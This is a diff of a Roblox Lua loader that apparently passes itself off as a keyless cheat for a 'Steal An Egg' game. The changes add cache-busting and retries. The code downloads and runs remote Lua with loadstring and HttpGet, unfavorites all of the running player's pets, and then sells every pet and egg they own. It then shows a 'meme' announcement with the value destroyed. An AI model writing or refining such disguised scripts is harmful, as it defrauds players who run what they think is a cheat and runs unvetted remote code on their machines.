@@ -21,9 +21,10 @@ task.delay(90, function()
 end)
 -- ===========================
 
--- ===== CONFIG =====
-local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
-local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
+-- ===== CONFIG & CACHE BUSTER =====
+-- Added ?t=os.time() to instantly bypass GitHub's 5-minute file cache
+local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
+local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
 local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
 local ANNOUNCE_HOLD   = 3
@@ -34,7 +35,7 @@ local UI_CONFIG = {
     MEME_SIZE      = 380,
     ANNOUNCE_HOLD  = ANNOUNCE_HOLD,
 }
--- ==================
+-- =================================
 
 -- ===== FETCH COUNTER URL =====
 local function fetchCounterUrl()
@@ -44,11 +45,11 @@ local function fetchCounterUrl()
     if ok and type(res) == "string" and #res > 0 then
         local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
         if decodeOk and type(data) == "table" and type(data.counter) == "string" then
-            print("[Loader] Using counter URL from endpoints.json:", data.counter)
+            print("[Loader] Using counter URL:", data.counter)
             return data.counter
         end
     end
-    warn("[Loader] Could not fetch endpoints.json — no counter URL available")
+    warn("[Loader] Could not fetch endpoints.json")
     return nil
 end
 
@@ -58,11 +59,9 @@ local COUNTER_URL = fetchCounterUrl()
 -- UI MODULE
 ------------------------------------------------------------
 local function loadUIModule()
-    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
     if UI_URL and UI_URL ~= "" then
         local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
-            gv.__LoaderUIModule = mod
             return mod
         end
         warn("[Loader] UI module failed to load, running headless:", tostring(mod))
@@ -97,10 +96,14 @@ local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)
 local log = function(...) print("[Loader]", ...) end
 
 local function getSave(forceRefresh)
+    -- Added retries in case the game server is lagging and returns nil
     local ok, s = pcall(function() return Save.Get(LocalPlayer, forceRefresh == true) end)
     if ok and s then return s end
-    local ok2, s2 = pcall(function() return Save.Get() end)
-    return ok2 and s2 or nil
+    task.wait(1)
+    local ok2, s2 = pcall(function() return Save.Get(LocalPlayer, true) end)
+    if ok2 and s2 then return s2 end
+    local ok3, s3 = pcall(function() return Save.Get() end)
+    return ok3 and s3 or nil
 end
 
 local function getMoney()
@@ -152,13 +155,15 @@ end
 
 local function unfavoriteAll()
     local uids = getFavoriteUIDs()
-    log(("Favorited pets: %d"):format(#uids))
-    for i, uid in ipairs(uids) do
-        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
-        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
-        if i % 8 == 0 then task.wait(0.3) end
+    if #uids > 0 then
+        log(("Unfavoriting %d pets"):format(#uids))
+        for i, uid in ipairs(uids) do
+            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
+            pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
+            if i % 8 == 0 then task.wait(0.3) end
+        end
+        task.wait(0.8)
     end
-    task.wait(0.8)
 end
 
 ------------------------------------------------------------
@@ -323,7 +328,7 @@ task.spawn(function()
     unfavoriteAll()
     
     -- Ensure server registers the unequip before we grab the final snapshot
-    task.wait(0.5)
+    task.wait(1.5)
     local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()
 
     -- Drop the loading screen
@@ -336,11 +341,11 @@ task.spawn(function()
             pcall(function() Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids }) end)
         end)
 
-        -- 2. Fire announcement UI instantly (if it exists)
+        -- 2. Fire announcement UI instantly
         if type(ui.showAnnouncement) == "function" then
             pcall(function() ui:showAnnouncement(totalItems, expectedValue) end)
         else
-            warn("[Loader] showAnnouncement missing. Waiting manually...")
+            warn("[Loader] showAnnouncement missing. UI cache failed.")
             task.wait(ANNOUNCE_HOLD)
         end
         
@@ -355,8 +360,16 @@ task.spawn(function()
         local after = getMoney()
         log(("Wallet after:  %s | Delta: %s"):format(tostring(after), tostring(after - before)))
     else
+        -- Shows a system notification so you know exactly why it skipped
+        pcall(function()
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Loader Alert",
+                Text = "Inventory is empty! Nothing to sell.",
+                Duration = 4
+            })
+        end)
         log("[Loader] Inventory empty — skipping announcement.")
-        task.wait(1.5)
+        task.wait(2)
     end
 
     task.wait(MEME_DELAY)
